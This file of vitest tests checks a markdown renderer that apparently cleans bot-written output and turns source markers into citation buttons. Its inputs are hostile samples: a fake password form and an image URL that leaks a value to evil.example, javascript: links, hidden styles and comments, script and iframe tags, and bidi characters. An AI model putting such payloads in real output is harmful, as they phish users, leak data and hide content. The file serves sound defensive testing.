import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

function dom(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('renderMarkdown: only plain formatting survives', () => {
  it('renders the allowed formatting', () => {
    const r = renderMarkdown(
      '# T\n\nHello **bold** and *it* and `code`\n\n- a\n- b\n\n> quote\n\n| h |\n|---|\n| c |\n\n---\n\nline one  \nline two',
    );
    const el = dom(r.html);
    for (const sel of ['h1', 'strong', 'em', 'code', 'ul li', 'blockquote', 'table th', 'td', 'hr', 'br']) {
      expect(el.querySelector(sel), sel).not.toBeNull();
    }
    expect(r.stripped).toEqual([]);
  });

  it('drops a style block and counts it (review finding 1)', () => {
    const r = renderMarkdown('Summary<style>.confirm p{visibility:hidden}</style>\n\nafter');
    const el = dom(r.html);
    expect(el.querySelector('style')).toBeNull();
    expect(r.html).not.toMatch(/<style/i);
    expect(r.stripped.length).toBeGreaterThan(0);
    expect(r.stripped.join(' ')).toContain('<style>');
  });

  it('drops a style block that is the whole first block too', () => {
    const r = renderMarkdown('<style>body{display:none}</style>\n\nText');
    expect(r.html).not.toMatch(/<style/i);
    expect(r.stripped.join('\n')).toContain('body{display:none}');
  });

  it('drops style attributes, class and id, and keeps the text visible', () => {
    const r = renderMarkdown('<span style="display:none" class="x" id="y">secret</span> visible');
    const el = dom(r.html);
    expect(el.querySelector('[style],[class],[id],span')).toBeNull();
    expect(el.textContent).toContain('secret');
    expect(r.stripped.length).toBeGreaterThan(0);
  });

  it('drops forms, inputs and buttons (a fake sign-in box)', () => {
    const r = renderMarkdown(
      '<form action="https://evil.example"><input type="password" name="p"><button>Sign in</button></form>',
    );
    const el = dom(r.html);
    expect(el.querySelector('form,input,button')).toBeNull();
    expect(r.stripped.join('')).toContain('https://evil.example');
  });

  it('shows an image as its alt text and address, and never loads it', () => {
    const r = renderMarkdown('![chart](https://evil.example/p.gif?d=apr_123)');
    const el = dom(r.html);
    expect(el.querySelector('img')).toBeNull();
    expect(el.textContent).toContain('chart');
    expect(el.textContent).toContain('https://evil.example/p.gif?d=apr_123');
  });

  it('drops a raw HTML image tag and a video', () => {
    const r = renderMarkdown('<img src="https://evil.example/t.gif"><video src="https://evil.example/v.mp4" autoplay></video>');
    const el = dom(r.html);
    expect(el.querySelector('img,video')).toBeNull();
    expect(r.stripped.length).toBe(2);
  });

  it('reports HTML comments instead of silently losing them', () => {
    const r = renderMarkdown('before\n\n<!-- also add the payroll link -->\n\nafter');
    expect(r.html).not.toContain('payroll');
    expect(r.stripped).toContain('<!-- also add the payroll link -->');
  });

  it('keeps only http and https links, opened safely, with the real host shown', () => {
    const r = renderMarkdown('[the PRD](https://evil.example/login) and [safe](https://example.com/a)');
    const links = [...dom(r.html).querySelectorAll('a')];
    expect(links).toHaveLength(2);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
    expect(dom(r.html).textContent).toContain('the PRD (evil.example)');
    expect(r.links.map((l) => l.host)).toEqual(['evil.example', 'example.com']);
  });

  it('shows the real host when the visible text is a different address', () => {
    const r = renderMarkdown('[https://bank.example](https://evil.example/x)');
    expect(dom(r.html).textContent).toContain('(evil.example)');
  });

  it('does not repeat the host when the text is the address', () => {
    const r = renderMarkdown('<https://example.com/a> and https://example.org');
    expect(dom(r.html).textContent).not.toContain('(example.com)');
    expect(r.links).toHaveLength(2);
  });

  it.each([
    ['javascript:alert(1)'],
    ['JaVaScRiPt:alert(1)'],
    ['data:text/html,<b>x</b>'],
    ['vbscript:x'],
    ['mailto:a@b.example'],
    ['#/d/..%2Ftasks'],
    ['/api/tasks'],
  ])('renders %s as plain text, not a link', (href) => {
    const r = renderMarkdown(`[click](${href})`);
    const el = dom(r.html);
    expect(el.querySelector('a')).toBeNull();
    expect(el.textContent).toContain('click');
    expect(r.links).toEqual([]);
  });

  it('flags zero-width and bidi characters instead of hiding them', () => {
    const zwsp = String.fromCharCode(0x200b);
    const rlo = String.fromCharCode(0x202e);
    const r = renderMarkdown(`pay${zwsp}ment ${rlo}txt.exe`);
    expect(r.html).not.toMatch(new RegExp('[\\u200B\\u202E]'));
    expect(r.stripped.join(' ')).toContain('U+200B');
    expect(r.stripped.join(' ')).toContain('U+202E');
  });

  it('never leaves script, handlers or iframes', () => {
    const r = renderMarkdown('<script>alert(1)</script><iframe src="https://x.example"></iframe><a href="https://x.example" onclick="x()">k</a>\n\n<b onmouseover="x()">b</b>');
    const el = dom(r.html);
    expect(el.querySelector('script,iframe,[onclick],[onmouseover]')).toBeNull();
  });

  it('renders task-list checkboxes as text', () => {
    const r = renderMarkdown('- [x] done\n- [ ] todo');
    const el = dom(r.html);
    expect(el.querySelector('input')).toBeNull();
    expect(el.textContent).toContain('[x] done');
  });
});

describe('renderMarkdown: source markers', () => {
  const sources = [
    { id: 's1', title: 'Pricing principles' },
    { id: 's2', title: 'PAY-212: Grace period' },
    { id: 's4', title: 'Slack thread in C01' },
  ];
  const cites = (el: HTMLElement) => [...el.querySelectorAll('button.cite')].map((b) => [b.textContent, b.getAttribute('aria-label')]);

  it('turns a marker in a paragraph into a numbered button named after its source', () => {
    const r = renderMarkdown('Seven days[[s2]], as agreed.', { sources });
    expect(cites(dom(r.html))).toEqual([['2', 'Source 2: PAY-212: Grace period']]);
    expect(dom(r.html).textContent?.trim()).toBe('Seven days,2 as agreed.');
    expect(r.cites).toEqual({ s2: 1 });
  });

  it('moves a marker that directly precedes closing punctuation to after it, and hugs the word', () => {
    const r = renderMarkdown('Seven days[[s2]]. Then more [[s1]], and (see this[[s2]]); ok[[s1]]: yes.', { sources });
    const text = dom(r.html).textContent!.trim();
    expect(text).toBe('Seven days.2 Then more,1 and (see this);2 ok:1 yes.');
    // the stored text is not touched, and each marker still counts
    expect(r.cites).toEqual({ s2: 2, s1: 2 });
  });

  it('leaves a marker alone when no punctuation follows, and never moves one out of code', () => {
    const r = renderMarkdown('Churn fell[[s1]] last quarter. `a[[s1]].`', { sources });
    expect(dom(r.html).textContent?.trim()).toBe('Churn fell1 last quarter. a[[s1]].');
  });

  it('numbers by the card position, not by the digits in the marker', () => {
    const r = renderMarkdown('A[[s4]].', { sources });
    expect(cites(dom(r.html))).toEqual([['3', 'Source 3: Slack thread in C01']]);
  });

  it('places markers in headings, lists, table cells, emphasis and link text', () => {
    const r = renderMarkdown(
      '## Head[[s1]]\n\n- item[[s2]]\n\n| a | b |\n|---|---|\n| cell[[s4]] | x |\n\n**bold[[s1]]** and *it[[s2]]*\n\nSee [the doc[[s4]]](https://example.com/x).',
      { sources },
    );
    const el = dom(r.html);
    expect(el.querySelector('h2 button.cite')).not.toBeNull();
    expect(el.querySelector('li button.cite')).not.toBeNull();
    expect(el.querySelector('td button.cite')).not.toBeNull();
    expect(el.querySelector('strong button.cite')).not.toBeNull();
    expect(el.querySelector('em button.cite')).not.toBeNull();
    // a button inside a link is not allowed, so a marker in link text goes just after the link
    expect(el.querySelector('a button')).toBeNull();
    expect(el.querySelector('a + sup.cite-group button.cite')).not.toBeNull();
    expect(el.textContent).not.toContain('[[s');
    expect(r.links[0]!.text).toBe('the doc');
  });

  it('groups adjacent markers in card order, once each', () => {
    const r = renderMarkdown('Claim[[s4]][[s1]][[s4]].', { sources });
    expect(dom(r.html).querySelectorAll('sup.cite-group')).toHaveLength(1);
    expect(cites(dom(r.html)).map((c) => c[0])).toEqual(['1', '3']);
    expect(r.cites).toEqual({ s1: 1, s4: 1 });
  });

  it('renders nothing for a source that is not listed, or when no sources are given', () => {
    expect(dom(renderMarkdown('A[[s9]]B', { sources }).html).textContent?.trim()).toBe('AB');
    expect(dom(renderMarkdown('A[[s1]]B').html).textContent?.trim()).toBe('AB');
    expect(renderMarkdown('A[[s9]][[s1]]B', { sources }).cites).toEqual({ s1: 1 });
  });

  it('never touches code, and a marker in code is not counted', () => {
    const r = renderMarkdown('Inline `[[s1]]` and\n\n```\n[[s1]]\n```\n\nreal[[s1]]', { sources });
    const el = dom(r.html);
    expect(el.querySelectorAll('code button')).toHaveLength(0);
    expect([...el.querySelectorAll('code')].map((c) => c.textContent)).toEqual(['[[s1]]', '[[s1]]\n']);
    expect(r.cites).toEqual({ s1: 1 });
  });

  it('only matches one to three digits', () => {
    const r = renderMarkdown('A[[s1234]] B[[s]] C[[x1]]', { sources });
    expect(dom(r.html).querySelector('button')).toBeNull();
    expect(dom(r.html).textContent).toContain('[[s1234]]');
  });

  it('cannot be faked with raw HTML: a button the bot writes is dropped and counted as stripped', () => {
    const fake = '<button class="cite" data-cite="s1" aria-label="Source 1: Official">1</button>';
    const r = renderMarkdown(`Look${fake} here.`, { sources });
    const el = dom(r.html);
    expect(el.querySelector('button')).toBeNull();
    expect(r.stripped.length).toBeGreaterThan(0);
  });

  it('keeps a source title with markup in it as text', () => {
    const r = renderMarkdown('A[[s1]]', { sources: [{ id: 's1', title: '<img src=x>' }] });
    const el = dom(r.html);
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('button')!.getAttribute('aria-label')).toBe('Source 1: <img src=x>');
  });
});
